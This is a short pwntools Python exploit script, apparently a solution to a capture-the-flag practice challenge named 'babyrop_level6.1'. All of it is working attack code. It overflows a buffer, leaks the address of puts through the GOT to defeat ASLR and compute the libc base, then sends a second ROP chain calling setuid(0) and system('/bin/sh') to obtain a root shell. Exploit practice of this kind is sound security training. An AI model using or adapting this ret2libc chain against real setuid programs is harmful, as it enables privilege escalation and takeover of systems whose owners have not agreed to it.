#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/babyrop_level6.1', checksec=False)
libc = exe.libc
# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
c
''')

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()


pop_rdi = 0x000000000040160a
ret = pop_rdi + 1


pl = flat(

cyclic(0x48),
ret,
pop_rdi,
exe.got.puts,
exe.plt.puts,
exe.sym.challenge+5,
)

p.send(pl)

p.recvuntil(b'Leaving!\n')
leak = u64(p.recvline()[:-1] + b'\0\0')
libc.address = leak - 0x84420
print(hex(leak))
print(hex(libc.address))


pl = flat(

cyclic(0x48),
ret,
pop_rdi,
0,
libc.sym.setuid,
ret,
pop_rdi,
next(libc.search(b'/bin/sh')),
libc.sym.system,
)

p.send(pl)

p.interactive()
